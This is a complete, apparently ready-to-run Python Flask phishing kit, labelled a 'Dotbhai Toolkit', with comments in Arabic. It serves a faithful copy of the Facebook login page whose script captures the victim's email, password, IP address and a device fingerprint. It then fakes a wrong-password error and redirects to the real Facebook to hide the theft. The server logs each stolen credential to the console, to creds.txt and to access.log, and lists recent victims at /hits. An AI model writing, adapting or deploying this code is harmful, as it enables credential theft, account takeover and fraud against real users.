from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import os

app = Flask(__name__)

CREDS_FILE = "creds.txt"
LOG_FILE   = "access.log"
HITS = []  # آخر اللقطات في الذاكرة

# ═══════════════════════════════════════════════════════════
# قالب صفحة فيسبوك — بيتقلد الـ desktop login
# ═══════════════════════════════════════════════════════════
FB_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook – log in or sign up</title>
<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.ico">
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    font-family: Helvetica, Arial, sans-serif;
    background:#f0f2f5;
    color:#1c1e21;
    min-height:100vh;
    display:flex;
    flex-direction:column;
  }
  .wrap {
    flex:1;
    display:flex;
    justify-content:center;
    align-items:center;
    gap:80px;
    padding:20px 40px;
    flex-wrap:wrap;
    max-width:1100px;
    margin:0 auto;
    width:100%;
  }
  /* ── العمود الأيسر ── */
  .left { flex:0 0 400px; padding-bottom:80px; }
  .fb-logo {
    width:300px;
    height:auto;
    margin-bottom:-8px;
  }
  .tagline {
    font-size:28px;
    line-height:32px;
    color:#1c1e21;
    font-weight:400;
    max-width:500px;
  }
  /* ── العمود الأيمن (البطاقة) ── */
  .right { flex:0 0 396px; }
  .card {
    background:#fff;
    border-radius:8px;
    box-shadow:0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
    padding:16px;
    width:396px;
  }
  .card input {
    width:100%;
    padding:14px 16px;
    font-size:17px;
    border:1px solid #dddfe2;
    border-radius:6px;
    margin-bottom:12px;
    outline:none;
    font-family:inherit;
  }
  .card input:focus { border-color:#1877f2; box-shadow:0 0 0 2px #e7f3ff; }
  .btn-login {
    width:100%;
    padding:12px;
    background:#1877f2;
    color:#fff;
    border:none;
    border-radius:6px;
    font-size:20px;
    font-weight:700;
    cursor:pointer;
    font-family:inherit;
    margin-bottom:16px;
  }
  .btn-login:hover { background:#166fe5; }
  .forgot {
    display:block;
    text-align:center;
    color:#1877f2;
    text-decoration:none;
    font-size:14px;
    margin-bottom:20px;
  }
  .forgot:hover { text-decoration:underline; }
  .divider {
    border-top:1px solid #dadde1;
    margin:20px 0;
  }
  .btn-new {
    display:block;
    margin:0 auto;
    padding:12px 16px;
    background:#42b72a;
    color:#fff;
    border:none;
    border-radius:6px;
    font-size:17px;
    font-weight:700;
    cursor:pointer;
    font-family:inherit;
  }
  .btn-new:hover { background:#36a420; }
  .below {
    text-align:center;
    font-size:14px;
    margin-top:28px;
    color:#1c1e21;
  }
  .below a { color:#1c1e21; font-weight:600; text-decoration:none; }
  .below a:hover { text-decoration:underline; }
  /* ── Footer ── */
  footer {
    background:#fff;
    padding:20px 40px;
    font-size:12px;
    color:#737373;
    border-top:1px solid #dddfe2;
  }
  .footer-langs { display:flex; flex-wrap:wrap; gap:8px 12px; margin-bottom:8px; }
  .footer-langs a { color:#737373; text-decoration:none; }
  .footer-langs a:hover { text-decoration:underline; }
  .footer-links { display:flex; flex-wrap:wrap; gap:8px 16px; margin-top:8px; }
  .footer-links a { color:#737373; text-decoration:none; }
  .err {
    color:#f02849;
    font-size:13px;
    margin-bottom:12px;
    display:none;
  }
  @media (max-width:900px) {
    .wrap { gap:20px; padding:20px; }
    .left { flex:1 1 100%; text-align:center; padding-bottom:0; }
    .fb-logo { width:200px; margin:0 auto; }
    .tagline { font-size:22px; margin:0 auto; text-align:center; }
    .right { flex:1 1 100%; display:flex; justify-content:center; }
    .card { width:100%; max-width:396px; }
  }
</style>
</head>
<body>

<div class="wrap">
  <div class="left">
    <!-- شعار فيسبوك SVG -->
    <svg class="fb-logo" viewBox="0 0 106 106" xmlns="http://www.w3.org/2000/svg">
      <circle cx="53" cy="53" r="53" fill="#1877F2"/>
      <path d="M73 53c0-11-9-20-20-20s-20 9-20 20c0 10 7.3 18.3 17 19.8v-14h-5v-5.8h5v-4.3c0-5 3-7.7 7.5-7.7 2.2 0 4.5.4 4.5.4v4.9h-2.5c-2.5 0-3.3 1.5-3.3 3.1v3.7h5.6l-.9 5.8h-4.7v14C65.7 71.3 73 63 73 53z" fill="#fff"/>
    </svg>
    <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
  </div>

  <div class="right">
    <div class="card">
      <div class="err" id="err">The password that you've entered is incorrect. <a href="#" style="color:#1877f2;text-decoration:none;">Forgotten password?</a></div>
      <form id="f" autocomplete="on">
        <input type="text"     id="email" name="email" placeholder="Email address or phone number" autocomplete="username" spellcheck="false" autofocus>
        <input type="password" id="pass"  name="pass"  placeholder="Password" autocomplete="current-password">
        <button type="submit" class="btn-login">Log in</button>
      </form>
      <a href="#" class="forgot">Forgotten password?</a>
      <div class="divider"></div>
      <button class="btn-new" type="button">Create new account</button>
    </div>
    <p class="below"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
  </div>
</div>

<footer>
  <div class="footer-langs">
    <a href="#">English (US)</a><a href="#">Español</a><a href="#">Français (France)</a>
    <a href="#">中文(简体)</a><a href="#">العربية</a><a href="#">Português (Brasil)</a>
    <a href="#">Italiano</a><a href="#">Deutsch</a><a href="#">हिन्दी</a><a href="#">日本語</a>
  </div>
  <div class="footer-links">
    <a href="#">Sign Up</a><a href="#">Log In</a><a href="#">Messenger</a>
    <a href="#">Facebook Lite</a><a href="#">Watch</a><a href="#">Places</a>
    <a href="#">Games</a><a href="#">Marketplace</a><a href="#">Facebook Pay</a>
    <a href="#">Oculus</a><a href="#">Portal</a><a href="#">Instagram</a>
    <a href="#">Bulletin</a><a href="#">Local</a><a href="#">Fundraisers</a>
    <a href="#">Services</a><a href="#">Voting Information Centre</a>
    <a href="#">Privacy Policy</a><a href="#">Terms</a><a href="#">Advertising</a>
    <a href="#">Create Page</a><a href="#">Developers</a><a href="#">Careers</a>
    <a href="#">Cookies</a><a href="#">AdChoices</a><a href="#">Terms</a><a href="#">Help</a>
  </div>
  <div style="margin-top:12px;">Meta © 2025</div>
</footer>

<script>
  // ═══ جمع معلومات الجهاز ═══
  async function getIP(){
    try { const r = await fetch('https://api.ipify.org?format=json'); return (await r.json()).ip; }
    catch(e){ return null; }
  }
  async function fp(){
    const d = {
      ua: navigator.userAgent,
      platform: navigator.platform,
      lang: navigator.language,
      screen: screen.width + 'x' + screen.height,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cores: navigator.hardwareConcurrency,
      touch: 'ontouchstart' in window
    };
    try {
      const c = document.createElement('canvas');
      const gl = c.getContext('webgl');
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    } catch(e){}
    return d;
  }

  document.getElementById('f').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    const pass  = document.getElementById('pass').value;

    if (!email || !pass) {
      document.getElementById('err').style.display = 'block';
      return;
    }

    const payload = {
      email: email,
      password: pass,
      ip: await getIP(),
      fp: await fp(),
      ts: new Date().toISOString()
    };

    try {
      await fetch('/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch(e){}

    // إظهار خطأ وإعادة التوجيه لإيهام المستخدم
    document.getElementById('err').style.display = 'block';
    document.getElementById('pass').value = '';
    setTimeout(() => {
      window.location.href = 'https://www.facebook.com/login/';
    }, 2500);
  });
</script>
</body>
</html>
"""

# ═══════════════════════════════════════════════════════════
# Routes
# ═══════════════════════════════════════════════════════════

@app.route("/")
def index():
    return render_template_string(FB_HTML)


@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json(silent=True) or {}
    email = data.get("email", "")
    password = data.get("password", "")
    ip = data.get("ip") or request.remote_addr
    fp = data.get("fp", {})
    ts = data.get("ts", datetime.now().isoformat())

    hit = {
        "ts": ts,
        "email": email,
        "password": password,
        "ip": ip,
        "ua": fp.get("ua", ""),
        "platform": fp.get("platform", ""),
        "lang": fp.get("lang", ""),
        "screen": fp.get("screen", ""),
        "tz": fp.get("tz", ""),
        "cores": fp.get("cores", ""),
        "gpu": fp.get("gpu", ""),
        "touch": fp.get("touch", False),
    }
    HITS.append(hit)

    # ═══ طباعة في الكونسول بشكل بارز ═══
    line1 = "=" * 62
    print(f"\n\033[92m{line1}\033[0m")
    print(f"\033[91m[+]\033[0m NEW HIT  —  \033[93m{ts}\033[0m")
    print(f"\033[92m{line1}\033[0m")
    print(f"  \033[96mEmail    :\033[0m \033[1;93m{email}\033[0m")
    print(f"  \033[96mPassword :\033[0m \033[1;91m{password}\033[0m")
    print(f"  \033[96mIP       :\033[0m {ip}")
    print(f"  \033[96mPlatform :\033[0m {hit['platform']}")
    print(f"  \033[96mLang     :\033[0m {hit['lang']}")
    print(f"  \033[96mScreen   :\033[0m {hit['screen']}")
    print(f"  \033[96mTimezone :\033[0m {hit['tz']}")
    print(f"  \033[96mCores    :\033[0m {hit['cores']}")
    print(f"  \033[96mGPU      :\033[0m {hit['gpu']}")
    print(f"  \033[96mTouch    :\033[0m {hit['touch']}")
    print(f"  \033[96mUA       :\033[0m {hit['ua']}")
    print(f"\033[92m{line1}\033[0m\n")

    # ═══ تخزين في ملف ═══
    with open(CREDS_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n[{ts}]\n")
        f.write(f"Email    : {email}\n")
        f.write(f"Password : {password}\n")
        f.write(f"IP       : {ip}\n")
        f.write(f"Platform : {hit['platform']}\n")
        f.write(f"Lang     : {hit['lang']}\n")
        f.write(f"Screen   : {hit['screen']}\n")
        f.write(f"Timezone : {hit['tz']}\n")
        f.write(f"Cores    : {hit['cores']}\n")
        f.write(f"GPU      : {hit['gpu']}\n")
        f.write(f"UA       : {hit['ua']}\n")
        f.write("-" * 62 + "\n")

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{ts} | {ip} | {email}:{password}\n")

    return jsonify({"ok": True}), 200


# ═══════════════════════════════════════════════════════════
# لوحة تحكم بسيطة تشوف بيها آخر اللي دخل
# ═══════════════════════════════════════════════════════════
@app.route("/hits")
def hits():
    return jsonify(HITS[-100:])


# ═══════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("\n\033[92m" + "═" * 62 + "\033[0m")
    print("  \033[1;93mFacebook Clone — Dotbhai Toolkit\033[0m")
    print("\033[92m" + "═" * 62 + "\033[0m")
    print("  \033[96mServer    :\033[0m http://0.0.0.0:5000")
    print("  \033[96mAdmin     :\033[0m http://0.0.0.0:5000/hits")
    print("  \033[96mCredentials file:\033[0m creds.txt")
    print("\033[92m" + "═" * 62 + "\033[0m\n")
    app.run(host="0.0.0.0", port=5000, debug=False)
